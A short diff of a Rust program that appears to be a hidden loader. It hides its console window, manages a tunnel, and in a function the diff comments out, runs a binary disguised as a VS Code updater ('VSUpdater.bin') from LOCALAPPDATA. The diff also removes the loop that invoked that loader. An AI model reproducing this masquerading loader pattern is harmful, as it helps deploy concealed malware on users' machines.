@@ -180,7 +180,8 @@ fn tunnelogout() -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
-fn binexecuteloop ()-> bool{
+//  TODO
+/* fn binexecuteloop ()-> bool{
     let binpath: String = format!("{}\\Microsoft\\VSCode\\VSUpdater.bin", 
         std::env::var("LOCALAPPDATA").unwrap_or_default());
     
@@ -193,7 +194,7 @@ fn binexecuteloop ()-> bool{
     else {
             return false;
     }  
-}
+} */
 
 fn main() {
     hide_console_window();
@@ -245,10 +246,5 @@ fn main() {
     }
 
     let _ = tunnel_handle.join();
-
-    // Loader function
-    while !binexecuteloop() {
-        binexecuteloop();
-    }
 
 }
